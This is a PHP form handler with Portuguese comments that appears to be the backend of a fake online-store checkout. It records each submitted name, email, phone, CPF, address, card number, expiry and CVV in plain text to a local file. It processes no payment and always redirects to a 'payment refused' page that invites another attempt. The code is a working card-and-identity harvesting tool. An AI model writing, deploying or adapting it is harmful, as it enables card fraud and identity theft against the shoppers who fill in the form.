<?php
header('Content-Type: text/html; charset=UTF-8');

// Caminho para salvar o arquivo
$file = 'dados_clientes.txt';

// Verifica se o método é POST
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Captura os dados enviados e aplica utf8_encode()
    $fullName = isset($_POST['full-name']) ? utf8_encode($_POST['full-name']) : '';
    $email = isset($_POST['email']) ? utf8_encode($_POST['email']) : '';
    $phone = isset($_POST['phone']) ? utf8_encode($_POST['phone']) : '';
    $cpf = isset($_POST['cpf']) ? utf8_encode($_POST['cpf']) : '';
    $cep = isset($_POST['cep']) ? utf8_encode($_POST['cep']) : '';
    $address = isset($_POST['address']) ? utf8_encode($_POST['address']) : '';
    $houseNumber = isset($_POST['house-number']) ? utf8_encode($_POST['house-number']) : '';
    $complement = isset($_POST['complement']) ? utf8_encode($_POST['complement']) : '';
    $cardNumber = isset($_POST['card-number']) ? utf8_encode($_POST['card-number']) : '';
    $cardExpiry = isset($_POST['card-expiry']) ? utf8_encode($_POST['card-expiry']) : '';
    $cardCVV = isset($_POST['card-cvv']) ? utf8_encode($_POST['card-cvv']) : '';

    // Monta o conteúdo para salvar no arquivo
    $content = "Nome: $fullName\n";
    $content .= "E-mail: $email\n";
    $content .= "Telefone: $phone\n";
    $content .= "CPF: $cpf\n";
    $content .= "CEP: $cep\n";
    $content .= "Endereço: $address\n";
    $content .= "Número: $houseNumber\n";
    $content .= "Complemento: $complement\n";
    $content .= "Cartão: $cardNumber\n";
    $content .= "Validade: $cardExpiry\n";
    $content .= "CVV: $cardCVV\n";
    $content .= "---------------------------\n";

    // Salva os dados no arquivo com a codificação correta
    if (file_put_contents($file, $content, FILE_APPEND)) {
        // Se o pagamento falhou, redireciona para a página de erro
        header("Location: recusado.html?retry=true#page2");
        exit();
    } else {
        echo "Erro ao salvar os dados!";
    }
} else {
    echo "Método inválido!";
}
?>
